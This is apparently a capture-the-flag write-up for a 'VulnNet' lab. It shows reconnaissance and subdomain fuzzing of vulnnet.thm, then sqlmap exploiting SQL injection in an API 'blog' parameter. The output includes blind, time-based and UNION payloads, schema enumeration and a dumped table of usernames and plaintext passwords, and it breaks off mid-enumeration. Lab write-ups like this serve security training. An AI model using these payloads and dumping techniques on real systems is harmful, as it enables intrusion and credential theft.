# What is the password of the CMS administrator?


- Added `10.10.226.82 vulnnet.thm`  to `/etc/hosts`
- Scanned ports for initial recon and found two ports open - `22` and `80` 

```console
❯ rustscan -a vulnnet.thm --ulimit 5000 -- -sC -sV | tee rustscan.log 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.226.82:22
Open 10.10.226.82:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-16 18:17 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
Initiating Ping Scan at 18:17
Scanning 10.10.226.82 [2 ports]
Completed Ping Scan at 18:17, 0.14s elapsed (1 total hosts)
Initiating Connect Scan at 18:17
Scanning vulnnet.thm (10.10.226.82) [2 ports]
Discovered open port 22/tcp on 10.10.226.82
Discovered open port 80/tcp on 10.10.226.82
Completed Connect Scan at 18:17, 0.15s elapsed (2 total ports)
Initiating Service scan at 18:17
Scanning 2 services on vulnnet.thm (10.10.226.82)
Completed Service scan at 18:17, 6.30s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.226.82.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 4.28s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.59s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
Nmap scan report for vulnnet.thm (10.10.226.82)
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-12-16 18:17:14 IST for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6xhSTxgS3q6xVmL6UU3hIbpiXzYcj2vxuAXXszyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x
|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=
|   256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds
```

- Scanned for directories on port `80` with gobuster

```console
❯ gobuster dir --url http://vulnnet.thm -w /usr/share/wordlists/dirb/common.txt  -x php,js,txt,html  | tee gobuster.log       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vulnnet.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt,html
[+] Timeout:                 10s
===============================================================
2022/12/16 18:17:54 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.js              (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
/images               (Status: 301) [Size: 311] [--> http://vulnnet.thm/images/]
/index.html           (Status: 200) [Size: 4346]                                
/index.html           (Status: 200) [Size: 4346]                                
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/]    
/README.txt           (Status: 200) [Size: 743]                                 
/server-status        (Status: 403) [Size: 276]                                 
===============================================================
2022/12/16 18:23:34 Finished
===============================================================
```


- Nothing interesting. 
- Scanned for DNS on the domain and found `shop`, `blog`, `api`, and `admin1`. 

```console
❯ wfuzz -c --hw 9 -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  | tee wfuzz.log       
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://vulnnet.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000037:   200        524 L    1406 W     26701 Ch    "shop"                                                                                                                
000000018:   200        390 L    1599 W     19316 Ch    "blog"                                                                                                                
000000051:   200        0 L      4 W        18 Ch       "api"                                                                                                                 
000000689:   400        10 L     35 W       301 Ch      "gc._msdcs"                                                                                                           
000001219:   307        0 L      0 W        0 Ch        "admin1"                                                                                                              

Total time: 0
Processed Requests: 4989
Filtered Requests: 4984
Requests/sec.: 0
```

- Added all these domains to my `/etc/hosts`

```console
❯ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.226.82	vulnnet.thm
10.10.226.82	shop.vulnnet.thm
10.10.226.82	blog.vulnnet.thm
10.10.226.82 	api.vulnnet.thm
10.10.226.82	admin1.vulnnet.thm

::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
```

- While opening a blog on `blog.vulnnet.thm`, it gives a GET request to `http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5`
- Scanned this with `sqlmap` and found it vulnerable to `SQLI`, so dumped the columns . 

```console
❯ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/\?blog\=5  --risk=3 --level=5 --columns | tee sqlmap.log
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:10:47 /2022-12-16/

[20:10:47] [INFO] testing connection to the target URL
[20:10:47] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:10:47] [INFO] testing if the target URL content is stable
<--------------------------SNIP------------------------->
[20:10:51] [INFO] GET parameter 'blog' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[20:10:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[20:11:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
<------------------------------SNIP---------------------->
[20:11:19] [INFO] GET parameter 'blog' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[20:11:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:11:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:11:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:11:20] [INFO] target URL appears to have 3 columns in query
[20:11:21] [INFO] GET parameter 'blog' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'blog' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 6105=6105

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
---
[20:11:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:11:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
[20:11:27] [INFO] fetching current database
[20:11:28] [INFO] fetching tables for database: 'blog'
[20:11:28] [INFO] fetching columns for table 'users' in database 'blog'
[20:11:28] [INFO] fetching columns for table 'details' in database 'blog'
[20:11:28] [INFO] fetching columns for table 'blog_posts' in database 'blog'
[20:11:28] [INFO] fetching columns for table 'metadata' in database 'blog'
Database: blog
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+

Database: blog
Table: details
[4 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| cc         | varchar(50) |
| city       | varchar(50) |
| first_name | varchar(50) |
| id         | int(11)     |
+------------+-------------+
 
Database: blog
Table: blog_posts
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| id     | int(11)      |
| status | varchar(50)  |
| titles | varchar(256) |
+--------+--------------+

Database: blog
Table: metadata
[3 columns]
+---------+-------------+
| Column  | Type        |
+---------+-------------+
| browser | varchar(50) |
| flag    | int(11)     |
| id      | int(11)     |
+---------+-------------+

[20:11:29] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 20:11:29 /2022-12-16/

```

- We can get password in **Database - blog, Table - users**  , so dumped it.

```console
❯ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/\?blog\=5  --risk=3 --level=5 -D blog -T users -C id,password,username --dump | tee sqlmap_data.log
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.7#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:14:09 /2022-12-16/

[20:14:09] [INFO] resuming back-end DBMS 'mysql' 
[20:14:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 6105=6105

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
---
[20:14:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:14:10] [INFO] fetching entries of column(s) 'id,password,username' for table 'users' in database 'blog'
[20:14:10] [WARNING] reflective value(s) found and filtering out
Database: blog
Table: users
[651 entries]
+-----+---------------------+--------------------+
| id  | password            | username           |
+-----+---------------------+--------------------+
[20:14:11] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 396 | D8Gbl8mnxg          | lspikinsaz         |
| 397 | kLLxorKfd           | profeb0            |
| 398 | cdXAJAR             | sberrymanb1        |
| 399 | 0hdeFiZBRJ          | ajefferiesb2       |
| 400 | 6rl6qXSJDrr         | hkibblewhiteb3     |
| 401 | DuYMuI              | dtremayneb4        |
| 402 | fwbk0Vgo            | bflewinb5          |
| 403 | 92Fb3vBF5k75        | kmolineuxb6        |
| 404 | zzh9wheBjX          | fjosefsb7          |
| 405 | sAGTlyBrb5r         | tmiskellyb8        |
| 406 | 3uUPdL              | nallrightb9        |
| 407 | fp2LW0x             | hlevermoreba       |
| 408 | IKhg7D              | celgerbb           |
| 409 | Tjyu2Ch2            | frustedbc          |
| 410 | NgKgdeKRVEK         | imeneghibd         |
| 411 | wGWMg3d             | vgouninbe          |
| 412 | ruTxBc2n85          | cbartoschbf        |
| 413 | ZydELwZFV2          | lcordonbg          |
| 414 | ROfVmvZSYS          | dappsbh            |
| 415 | B4SBGt5yAD          | zduchanbi          |
| 416 | zhE95JJX9l          | jfraybj            |
| 417 | nXSVHhVW9S          | mlanchesterbk      |
| 418 | NCeU070             | cgylesbl           |
| 419 | WzkvfoedkXJx        | cbonnifacebm       |
| 420 | ktPBpK1             | btoppasbn          |
| 421 | 8fCXE6BF9gj         | mdurrettbo         |
| 422 | cSAjOy              | skilroybp          |
| 423 | HLUHZ9oQ            | uvonderemptenbq    |
| 424 | gTc7TiSsd2          | dvinsenbr          |
| 425 | 7yQ0b1B             | ltiltbs            |
| 426 | SXD1eC6ysa          | dsimcoebt          |
| 427 | bgb084kq            | wfrailbu           |
| 428 | NsJFz4DLpI          | lmityukovbv        |
| 429 | 7JVPatN             | vkellarbw          |
| 430 | yuTnSPEvIoJ4        | rkingstonbx        |
| 431 | L3ttm8              | rbakewellby        |
| 432 | vyae6t              | dbousteadbz        |
| 433 | iA4AD4UlcLF1        | vstaddenc0         |
| 434 | VlyIAh              | rwhacketc1         |
| 435 | IpsnIEbIaT          | tnoorc2            |
| 436 | UPU9rZu8q           | dduffync3          |
| 437 | xuUXUFXoc           | dstichelc4         |
| 438 | yTuqouj9ZK          | kcleverlyc5        |
| 439 | QDneobZ1DH          | sreinertc6         |
| 440 | OdrnoHtrP           | mcottinghamc7      |
| 441 | c3KvR6              | ljansemac8         |
| 442 | GMbFP9              | acodac9            |
| 443 | zIZ11OPuj           | rhuggardca         |
| 444 | XCX2GVx             | gkeechcb           |
| 445 | nJQgYR2uOyZq        | syurincc           |
| 446 | AQlFlPvf            | agaulecd           |
| 447 | zj6vR6Bf            | wboijce            |
| 448 | eL5uJnLD2           | kphifercf          |
| 449 | 7HEMdTc07           | abenglecg          |
| 450 | VbzVZoYn            | emarkingch         |
| 451 | wln8WN3PJ           | nmuldowneyci       |
| 452 | 3AcKBTHRN           | jbygrovecj         |
| 453 | 32ZXql9Uw8          | bduxburyck         |
| 454 | 2pnBsk6i            | fthewcl            |
| 455 | JxcEXKAN            | kmeececm           |
| 456 | rkyCMLwOIt          | bholligancn        |
| 457 | KlxQ4Vxl            | bferonetco         |
| 458 | OFc5f2              | jcraycp            |
| 459 | SsLMTxbw            | hethertoncq        |
| 460 | nUpdnCZW1cqr        | cclayecr           |
| 461 | 0I7ldSNbm           | tmcbreartycs       |
| 462 | gqQeawiZ            | oderuggieroct      |
| 463 | djQBjW3pk           | rdoerscu           |
| 464 | G9FarmKd            | karbucklecv        |
| 465 | lXCoFI              | bbuckbycw          |
| 466 | WAMRuFTTI3          | ldixseecx          |
| 467 | diVq6PDeEpz         | jmahedycy          |
| 468 | bV6cXPOFfLg         | gdamrellcz         |
| 469 | dCrF5fv             | sgarrettd0         |
| 470 | Q4gYmlM             | plaurenceaud1      |
| 471 | SnvFrSB6AB          | kmcgeacheyd2       |
| 472 | qiehVyQ             | mhopewelld3        |
| 473 | At9A4aCJos          | chottond4          |
| 474 | 8T9v08352re         | hsellandd5         |
| 475 | y8chyGC9js          | syegorkovd6        |
| 476 | ghMz6e68c1Z         | adavisond7         |
| 477 | 00S7q8S1f8W         | amewisd8           |
| 478 | 2rruluVz0SwY        | lorpind9           |
| 479 | hXaVYfHUZoz         | jbilovskyda        |
| 480 | j7GAP4v             | jhalforddb         |
| 481 | 0MM46yTEVBL2        | wcolisbedc         |
| 482 | QUDViFUxO           | cgreastydd         |
| 483 | YGcBpM              | ajackde            |
| 484 | 2js9AM              | cmcgarritydf       |
| 485 | oJ38KUXgm           | tjostdg            |
| 486 | KP9DmIk             | lguidendh          |
| 487 | qNYURfhw            | mbletsodi          |
| 488 | jDmbnZJi            | wsneesbydj         |
| 489 | t8xlAuAvH8Yj        | glerouxdk          |
| 490 | TTin1up             | yhaythornthwaitedl |
| 491 | 0ftVkbqP            | nzmitrovichdm      |
| 492 | Kwcozh              | jgodballdn         |
| 493 | TWnwDTB             | jkiddeydo          |
| 494 | IxQgXLrw            | acaghandp          |
| 495 | AxuOsAA0lqrc        | rattestonedq       |
| 496 | GCpyVf              | mmichallatdr       |
| 497 | YnPCjKg             | rgaitoneds         |
| 498 | NOYhOlnC            | krobbekedt         |
| 499 | pjSBcAVD            | nknollerdu         |
| 500 | 5RigTGe             | wshemeltdv         |
| 501 | jwKMTMu             | rpeperelldw        |
| 502 | 4qfwbKNed3I         | lbescobydx         |
| 503 | qSX9N1Kf8XJ         | jparishdy          |
| 504 | AoIrka              | jminghidz          |
| 505 | Ft4xVROXXCd5        | nforthe0           |
| 506 | x3WIaoX99yb         | tklemensiewicze1   |
| 507 | hXcrFv              | epotterye2         |
| 508 | 6ZtJhp4col          | lbrugmanne3        |
| 509 | bqItfg4wf           | adencse4           |
| 510 | 5W4lM81DPo          | cfloreze5          |
| 511 | IT6p5HT             | amatanine6         |
| 512 | 0Q6T9jvAZB          | fchalkere7         |
| 513 | M7lvtAz6oRNS        | rytere8            |
| 514 | MpO7FgPoz           | cstillee9          |
| 515 | 8rIuhW0VZ           | cbashamea          |
| 516 | OS15i4              | flyeseb            |
| 517 | Usl7mH2H            | gtieryec           |
| 518 | WDAliOAKFj7f        | sborgheseed        |
| 519 | iwpk0YC             | hmctrustyee        |
| 520 | lN8d6g1             | wvigeref           |
| 521 | nuwPbeTIgX8F        | nbockeneg          |
| 522 | LvBDyc9JRPV         | ffranzmaneh        |
| 523 | ncpiXJX             | drippingaleei      |
| 524 | vQUTz2xEyWx4        | achambersej        |
| 525 | wQcbURC             | fsuarezek          |
| 526 | irTEDl2k            | kaspoleel          |
| 527 | H6WyTMdy            | mmursellem         |
| 528 | pukixtg             | szecchinellien     |
| 529 | Or6dtgSGmd          | cnewlineo          |
| 530 | VhkvlZO             | cmccrowep          |
| 531 | slncO0kvmb          | shavershameq       |
| 532 | svJ4749mzdJ         | jtumeltyer         |
| 533 | weR5eukJOX6C        | cmathivates        |
| 534 | rp8sqUpw            | btarzeyet          |
| 535 | 8T7UFX              | fstedmaneu         |
| 536 | SkuuzEsAZ           | mgaitoneev         |
| 537 | RIs9MA              | zscotlandew        |
| 538 | ttKwcGDELB          | dfurbyex           |
| 539 | PVVOkQqHVdU         | sdallowey          |
| 540 | Szh74h              | lmccormackez       |
| 541 | wMkLVr0             | arenneyf0          |
| 542 | 4Bux8MCHXS          | lbodegaf1          |
| 543 | ZXIOChbv            | rsantostefanof2    |
| 544 | PcJPLBJf            | mvaissieref3       |
| 545 | kgjhKzMWYakS        | csolwayf4          |
| 546 | p69xguJZe           | pwaddingtonf5      |
| 547 | ntswwsY             | kchaffeyf6         |
| 548 | lh0Llscj            | zgooblef7          |
| 549 | uqzWk2PYLJR7        | pwassf8            |
| 550 | eIZQxLh             | bmcclenaghanf9     |
| 551 | IDp96W1RUb          | bhaddintonfa       |
| 552 | Z7MGodFb            | rblesingfb         |
| 553 | caw1QQ1             | mblownefc          |
| 554 | QpPSspEWus          | lwhitlandfd        |
| 555 | u6ZBlHvmId          | lgoftonfe          |
| 556 | BvZ0JJNVWCX         | vdubbleff          |
| 557 | Ih1thIl             | dfrenschfg         |
| 558 | jmjhYpmgg           | gofarrisfh         |
| 559 | LFXCNqt5hN          | kpipkinfi          |
| 560 | tofKHos             | sshilstonfj        |
| 561 | fCMRSGm4BzNQ        | lstanistreetfk     |
| 562 | zFdwNg16yCdB        | ktomasellifl       |
| 563 | qJhjNz0sK7Z         | fmarkhamfm         |
| 564 | wmd4CD60            | bledingtonfn       |
| 565 | mZjvZC              | yzettoifo          |
| 566 | 7MeBiB7             | coganfp            |
| 567 | VCV8FqINn           | sdibollfq          |
| 568 | OsZxivx             | blampkinfr         |
| 569 | HVBEN4              | mfachefs           |
| 570 | m9R8setEC           | kburelft           |
| 571 | q1SivtRlbetm        | bgrimsdithfu       |
| 572 | fRnopRDUrds         | ctolemanfv         |
| 573 | eZ3TzXtdD           | awhiteheadfw       |
| 574 | Uh2kDLMNFeej        | mchislettfx        |
| 575 | Ln6WDY              | lreichardtfy       |
| 576 | kGBl9CgCPcGF        | bjossfz            |
| 577 | TuK60tJ             | hprevostg0         |
| 578 | mwTGls              | rpritchettg1       |
| 579 | Ym2cHtkuW           | dantonssong2       |
| 580 | axZcgE9T            | gmantrupg3         |
| 581 | 6LFtl39ggEtI        | dsimioneg4         |
| 582 | 79hJw4u             | lmiddleg5          |
| 583 | UdPazP              | amcquorkelg6       |
| 584 | hFdDjfcdwCja        | mellwandg7         |
| 585 | w9Copz4             | ddunbobing8        |
| 586 | K67Hs5              | cszabog9           |
| 587 | molOCywSVk          | cdorbonga          |
| 588 | wWQpqk              | fridgwellgb        |
| 589 | Ipmq9QvTymr         | ksiregc            |
| 590 | 7v4eltt3Kuw         | hwhardleygd        |
| 591 | ctvNF49tuT          | hpoppletonge       |
| 592 | hFgxHo5Xp           | aghidoligf         |
| 593 | g4St9w              | fstilinggg         |
| 594 | DTSos9KOFhIO        | ebodechongh        |
| 595 | 0lj1adMG            | rbennellickgi      |
| 596 | kNEDmUrVp           | gnaldergj          |
| 597 | 8kt6CKNTc           | preygk             |
| 598 | Khmoz3bGQiwo        | cjigglegl          |
| 599 | 2UrQCd16gtqN        | aburgisgm          |
| 600 | yQrAEzZxK           | nluddygn           |
| 601 | TeFpfcTSt4K         | lcluttengo         |
| 602 | Q8vHxue1            | laseefgp           |
| 603 | 8sNg5H              | wdovergq           |
| 604 | BB2ymU              | bjackesgr          |
| 605 | CTCPBoG             | sphebeygs          |
| 606 | KoM1f3mmxlC         | hhushergt          |
| 607 | H9fzdE              | dmowatgu           |
| 608 | OQ4Axwb             | vgoodhandgv        |
| 609 | zo9YGPcnoFY         | vcocktongw         |
| 610 | wNfgrMLd92          | afrackiewiczgx     |
| 611 | L70zF2              | wmccorkellgy       |
| 612 | vjlPxrlrB1          | mbaldersongz       |
| 613 | 1fDBrk              | jdovingtonh0       |
| 614 | NVQobq              | tlunneyh1          |
| 615 | 4IHZylSa6uSk        | lwaulkerh2         |
| 616 | 6mqTbfJcyB          | nceccolih3         |
| 617 | BtdoQGpOg           | aworsnuph4         |
| 618 | HA5wRx2Xkt          | pwheelhouseh5      |
| 619 | rsQIXNF4p56t        | ashearsh6          |
| 620 | DD87MyB             | bhendriksh7        |
| 621 | EqEt2NXw37Q         | tgrovierh8         |
| 622 | oN9I8Sf             | kspanswickh9       |
| 623 | HkZs0YLv            | krattrayha         |
| 624 | LTSB3oaxy9          | anorcockhb         |
| 625 | 2lOIMadSDW2         | kneathc            |
| 626 | 2YDcmeZaKwig        | ajaggarhd          |
| 627 | 7pA32uFwx8eh        | krossbrookehe      |
| 628 | yoWnriWXeTc         | lpavelhf           |
| 629 | OglY7vT0Pyn         | agaitskillhg       |
| 630 | GBCtL62Xa           | bmylechreesthh     |
| 631 | JdHOJPdpZV          | hsimenothi         |
| 632 | PT8RllCQ            | bbrunihj           |
| 633 | bJR3DOVL            | sroysonhk          |
| 634 | yoJwhOI             | bmarrinerhl        |
| 635 | tfncTGLw            | ataillanthm        |
| 636 | dBcYuQwU            | acassamhn          |
| 637 | s6QjWpLo            | kfruchonho         |
| 638 | LTbmsk6T            | kdenyakinhp        |
| 639 | xrbjFjA8p           | mhundyhq           |
| 640 | gaMmTSLHkMZE        | zcatchesidehr      |
| 641 | VH3FsbYfk           | anorcrosshs        |
| 642 | YY6hmavoD           | kklavesht          |
| 643 | kElKt4              | bloghanhu          |
| 644 | 4eHrdt5Z            | ekayzerhv          |
| 645 | 2QZrPJ2             | jovenhw            |
| 646 | t0xmZtLTXa          | gboayshx           |
| 647 | 09jD21OoQ           | asuermeiershy      |
| 648 | OBJZD6f             | msambidgehz        |
| 649 | Cc4QOkuSvrF         | bhuertai0          |
| 650 | kSKBUj8             | oboatmani1         |
| 651 | BIkqvmX             | rtamblingi2        |
+-----+---------------------+--------------------+

[20:14:11] [INFO] table 'blog.users' dumped to CSV file '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv'
[20:14:11] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 20:14:11 /2022-12-16/


```


- But still don't know where to use these passwords, so scanned directories of `admin1.vulnnet.thm` and found `typo3`, which seems to be a `CMS` 
- Scanned for databases with `sqlmap` and found `vn_admin`

```console
❯ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/\?blog\=5  --risk=3 --level=5 -dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:28:04 /2022-12-16/

[20:28:04] [INFO] resuming back-end DBMS 'mysql' 
[20:28:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 6105=6105

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7521 FROM (SELECT(SLEEP(5)))wlWw)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-3139 UNION ALL SELECT NULL,NULL,CONCAT(0x7176717671,0x6e626241765467685a78777164596879714d6a5a6d7547467742565558637078594352526b585142,0x717a707871)-- -
---
[20:28:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[20:28:05] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[20:28:05] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 20:28:05 /2022-12-16/
```

- Scanned for tables 

```console
❯ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/\?blog\=5  --risk=3 --level=5 -D vn_admin --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

